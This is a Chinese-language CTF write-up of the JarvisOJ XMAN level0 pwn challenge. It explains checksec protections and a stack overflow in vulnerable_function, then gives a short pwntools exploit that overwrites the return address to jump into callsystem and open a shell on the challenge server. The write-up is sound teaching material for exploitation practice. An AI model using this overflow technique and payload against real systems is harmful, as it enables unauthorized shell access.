---
title: XMAN level0 の Write-Up
date: 2020-05-01 17:40:33
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- Stack
---
## Introduction

这是JarvisOJ的PWN题部分[XMAN]level0的Write-Up，也是第一次尝试PWN题，这题比较简单，就是简单的栈溢出覆盖返回地址，很适合刚上手的Rookie（比如我==）。

<!-- more -->

## Step 1

首先checksec一下程序：

![](/img/XMAN-level0/XMAN1.png)

checksec是检查程序是否打开或关闭某些保护机制的一个脚本。相关参数意义为：

* RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表；

* Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；

* NX：NX enabled表示这个保护开启，意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用ROP这种方法绕过；

* PIE：enabled表示启用内存布局随机化，如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址；

* FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制：(1)包含%n的格式化字符串不能位于程序内存中的可写地址；(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。

运行程序如下图所示：

![](/img/XMAN-level0/XMAN2.png)

## Step 2

把程序拖到Hopper Disassambler中看下伪C代码：

![](/img/XMAN-level0/XMAN3.png)

函数中有个非常明显的vulnerable_function函数，明确的告诉我们存在漏洞，看下代码果然存在栈溢出漏洞。

然后还看到一个callsystem函数，在函数中调用了shell：

![](/img/XMAN-level0/XMAN4.png)

这样思路就很简单了，通过vulnerable_function函数的栈溢出覆盖返回地址，跳转到callsystem函数入口调出shell。

## Step 3

由vulnerable_function函数可以发现buffer到rbp的距离为0x80字节，加上0x08字节的rbp（64位程序中rbp为8字节，32位程序中为4字节），这样就可以得到vulnerable_function函数的返回地址了，然后把这个返回地址覆盖为callsystem函数的入口地址即可：

![](/img/XMAN-level0/XMAN5.png)

## Appendix

EXP代码:

```Python
from pwn import *

#sh = process('./level0')
sh = remote('pwn2.jarvisoj.com', 9881)

elf = ELF('./level0')

shell_addr = elf.symbols['callsystem']

payload = 'a' * (0x80 + 0x8) + p64(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()
```